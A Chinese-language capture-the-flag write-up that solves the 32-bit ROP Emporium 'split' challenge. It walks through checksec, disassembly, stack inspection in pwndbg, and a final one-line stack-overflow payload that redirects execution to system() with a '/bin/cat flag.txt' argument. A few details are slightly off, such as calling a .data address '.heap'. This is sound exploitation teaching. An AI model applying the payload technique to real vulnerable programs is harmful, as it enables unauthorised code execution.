## Checksec
| Short | Full | Description |
| --- | --- | --- |
| RELRO | RELocation Read Only | GOT 是否可写 |
| Stack | CANARY | Canary 是否启用（棧溢出检测） |
| NX | No-eXecute | Stack 页是否可执行 |
| PIE / PIC | Position Independent Executable / Code | 需搭配ASLR才能产生作用，细节见第二个section |

本题的 checksec 结果：
```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```
PIE 没启用，所以至少可以确定 bss, text, data 三个 segments 的位址固定。

<br>

## ASLR 与 PIE 的效果
Linux 中 ASLR 分为三个级别：

| Level | Randomized |
| --- | --- |
| 0（关闭） | - |
| 1（半随机） | shared libraries, stack |
| 2（全随机） | shared libraries, stack, heap |

<br>

PIE (Position Independent Executable) 是 gcc/g++ 中其中一个flag。

若启用，编译出来的执行档可被读取在内存中的任意位址并成功运行。

| Enabled | Randomized Targets |
| --- | --- |
| No | - |
| Yes | bss, text, data, heap |

<br>

## Reverse
列舉一下 functions
```
0x0804857b  main
0x080485f6  pwnme
0x08048649  usefulFunction
```

先逆向 pwnme()，发现其中一个被呼叫的函数是 fgets(buf, 0x60, stdin)。

buf 位于 ebp-0x28 处，若读入>0x28字节就会发生栈溢出。
```
0x0804862f <+57>:  mov    eax,ds:0x804a080
0x08048634 <+62>:  sub    esp,0x4
0x08048637 <+65>:  push   eax
0x08048638 <+66>:  push   0x60
0x0804863a <+68>:  lea    eax,[ebp-0x28]
0x0804863d <+71>:  push   eax
0x0804863e <+72>:  call   0x8048410 <fgets@plt>
```

我们可以通过覆盖 return address 跳转。但是，要跳转到哪里呢？逆向一下 usefulFunction()
```
0x08048649 <+0>:     push   ebp        # setup x86 stack frame
0x0804864a <+1>:     mov    ebp,esp    # setup x86 stack frame
0x0804864c <+3>:     sub    esp,0x8    # allocate space on stack
0x0804864f <+6>:     sub    esp,0xc    # allocate space on stack （为什么要分两步做。。。）
0x08048652 <+9>:     push   0x8048747  # push system() 的参数，参数是一个 char*，一个字串的头位址
0x08048657 <+14>:    call   0x8048430 <system@plt>  # 呼叫 system()：相当于 push eip
0x0804865c <+19>:    add    esp,0x10
0x0804865f <+22>:    nop
0x08048660 <+23>:    leave
0x08048661 <+24>:    ret
```

打印 system() 的参数，发现是 "/bin/ls" 这个字串。但这只能列出 cwd 下的文件，而我们目标是看到 flag，所以要想办法替换这个字串。
0x8048747 我们没办法覆盖到，所以要采取别的办法。
```
pwndbg> x/1s 0x8048747
0x8048747:      "/bin/ls"
```

开一个新的 terminal，用 strings 指令看一下 split32 包含什么字串
```
$ strings split32 | "bin"
/bin/ls
/bin/cat flag.txt
```

那么这个字串位址是啥。。。？我们可以开一个新的 gdb，得到 usefulString 位于 0x0804a030

可以自己用 x 指令确认一下是不是 "/bin/cat flag.txt" 字串，这边就不写这个流程了。
```
pwndbg> info variables
（省略若干条输出）
0x0804a030  usefulString
（省略若干条输出）
```

现在我们基本的思路就是：

1. 在 pwnme() 通过 stack bof 覆盖 return address
2. 执行到 ret 时，跳转 usefulFunction() 里面的 call system()
3. 为什么直接跳到 call system() 而不是它前面一点的地方？因为前一行是 push "/bin/ls"，我们不要这个参数
4. 既然不要这个参数，我们就得自己塞个参数是吧？那么要塞哪里呢？
5. ret = `pop eip`，然后下一条指令就是 `call system()`
6. 所以 call 之前的 esp 处，就是我们要塞 system() 参数的地方！

继续看 pwnme() 里面 fgets() 之后的汇编，发现有个非常sb的行为，居然 add esp, 0x10！？？？
```
0x0804863e <+72>:  call   0x8048410 <fgets@plt>
0x08048643 <+77>:  add    esp,0x10
0x08048646 <+80>:  nop
0x08048647 <+81>:  leave
0x08048648 <+82>:  ret
```

我们只好进行动态分析。断点设 *pwnme+77 并运行。输入几个'A'，然后看看 esp 后内存的内容。

我们可以发现 esp += 0x10 之后，esp正好就位于 buf 的头
```
pwndbg> x/25xw $esp
0xffffc750: 0xffffc760  0x00000060  0xf7f955c0  0xa33cf400
0xffffc760: 0x41414141  0x41414141  0x0000000a  0x00000000
0xffffc770: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffc780: 0x08048706  0x00000000  0xffffc798  0x080485d9
                                       ^ ebp      ^ ebp+4
0xffffc790: 0x00000000  0xffffc7b0  0x00000000  0xf7dcda11
```

接着分析 leave。
1. esp 会指向 ebp 所指向之处 (mov ebp, esp)
2. ebp 接着会变成「进 pwnme() 前的 ebp」 (pop ebp)

执行完 leave 后，esp 在：
```
0xffffc750: 0xffffc760  0x00000060  0xf7f955c0  0xa33cf400
0xffffc760: 0x41414141  0x41414141  0x0000000a  0x00000000
0xffffc770: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffc780: 0x08048706  0x00000000  0xffffc798 [0x080485d9] <-- esp
0xffffc790: 0x00000000  0xffffc7b0  0x00000000  0xf7dcda11
```

接着分析 ret。
1. ret = pop eip，所以会再 pop 一个 byte，也就是说执行 ret 后 esp 会再 += 4

执行完 ret 后，esp 在：
```
0xffffc750: 0xffffc760  0x00000060  0xf7f955c0  0xa33cf400
0xffffc760: 0x41414141  0x41414141  0x0000000a  0x00000000
0xffffc770: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffc780: 0x08048706  0x00000000  0xffffc798  0x080485d9
0xffffc790:[0x00000000] 0xffffc7b0  0x00000000  0xf7dcda11
               ^ esp
```

假设我们通过 bof，覆盖了 return address，现在 eip 得是 call system() 那行的位址了（0x08048657）

call 会直接 push eip, 然后把 eip 设成被呼叫的函数的位址。我们知道进入一个 function 后，return address 下就是接着参数。

因此！！！我们要塞的参数，就是在上图那个 esp 处！！！！！！！！payload 怎么写呢？复习一下我们 buffer 的样子
```
0xffffc760: 0x41414141  0x41414141  0x0000000a  0x00000000
0xffffc770: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffc780: 0x08048706  0x00000000  0xffffc798  0x080485d9
0xffffc790: 0x00000000
```

所以 payload 是 `11 * "AAAA"` + `usefulFunction() 里 call system() 那行指令的位址` + `usefulString 的位址`

因为 PIE 没开启，所以 .text 和 .data 位址都是固定的（上面我们用到的那两个位址，一个在 .text，一个在 .heap），这在编写 exploit 的时候方便许多。

gdb 中进行 pwn：
```
pwndbg> r <<< $(python2 -c 'print 11 * "AAAA" + "\x57\x86\x04\x08" + "\x30\xa0\x04\x08")
ROPE{a_placeholder_32byte_flag!}
```

exploit 脚本请看 exploit.py

---

顺带一提，怎么知道 usefulString 在 .heap?
```
pwndbg> info address usefulString
Symbol "usefulString" is at 0x804a030 in a file compiled without debugging.
```
pwndbg 会有颜色提示，0x804a030 是蓝色的字，代表在 heap 上。
